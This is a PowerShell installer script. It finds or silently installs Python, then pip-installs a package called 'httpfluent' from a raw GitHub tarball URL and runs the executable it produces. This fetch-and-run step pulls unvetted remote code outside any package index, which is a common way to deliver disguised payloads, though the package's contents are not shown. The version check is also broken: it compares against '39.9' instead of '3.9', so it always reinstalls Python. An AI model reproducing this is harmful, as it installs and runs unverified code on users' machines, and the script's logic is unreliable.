Write-Host "[*] Starting script..." -ForegroundColor Cyan

# -----------------------------
# Step 1: Find Python >= 3.9
# -----------------------------
$BestPython = $null
$BestVersion = $null
$Candidates = @()

$cmd = Get-Command python -ErrorAction SilentlyContinue
if ($cmd) {
    $Candidates += $cmd.Source
}

$Roots = @(
    "$env:LOCALAPPDATA\Programs\Python",
    "$env:ProgramFiles\Python",
    "$env:ProgramFiles(x86)\Python"
)

foreach ($root in $Roots) {
    if (Test-Path $root) {
        Get-ChildItem -Path $root -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $exe = Join-Path $_.FullName "python.exe"
            if (Test-Path $exe) {
                $Candidates += $exe
            }
        }
    }
}

foreach ($candidate in ($Candidates | Select-Object -Unique)) {
    try {
        $out = & $candidate --version 2>&1
        if ($out -match "Python (\d+\.\d+\.\d+)") {
            $ver = [version]$Matches[1]
            if ($ver -ge [version]"39.9") {
                if (-not $BestVersion -or $ver -gt $BestVersion) {
                    $BestVersion = $ver
                    $BestPython = $candidate
                }
            }
        }
    } catch {}
}

# -----------------------------
# Step 2: Install Python if missing
# -----------------------------
if (-not $BestPython) {
    Write-Host "[!] Python >= 3.9 not found. Installing Python 3.12.6..." -ForegroundColor Yellow

    $Installer = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe" -OutFile $Installer

    Start-Process -FilePath $Installer -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait

    $cmd = Get-Command python -ErrorAction SilentlyContinue
    if ($cmd) {
        $BestPython = $cmd.Source
    }
}

if (-not $BestPython -or -not (Test-Path $BestPython)) {
    Write-Host "[-] Python installation failed." -ForegroundColor Red
    exit 1
}

Write-Host "[+] Using Python: $BestPython" -ForegroundColor Green

# -----------------------------
# Step 3: Ensure pip
# -----------------------------
& $BestPython -m ensurepip | Out-Null
& $BestPython -m pip install --upgrade pip --no-user

# -----------------------------
# Step 4: Install httpfluent
# -----------------------------
& $BestPython -m pip install requests --no-user
& $BestPython -m pip install https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz --no-user

# -----------------------------
# Step 5: Resolve Scripts directory (SAFE)
# -----------------------------
$ScriptsDir = & $BestPython -c "import sysconfig;print(sysconfig.get_path('scripts'))"
$ScriptsDir = $ScriptsDir.Trim()

$HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"

Write-Host "[+] Scripts directory: $ScriptsDir" -ForegroundColor Green

# -----------------------------
# Step 6: Run httpfluent
# -----------------------------
if (Test-Path $HttpFluentExe) {
    Write-Host "[+] Launching httpfluent --help" -ForegroundColor Green
    & $HttpFluentExe --help
} else {
    Write-Host "not found." -ForegroundColor Red
}

Write-Host "[*] Script finished." -ForegroundColor Cyan
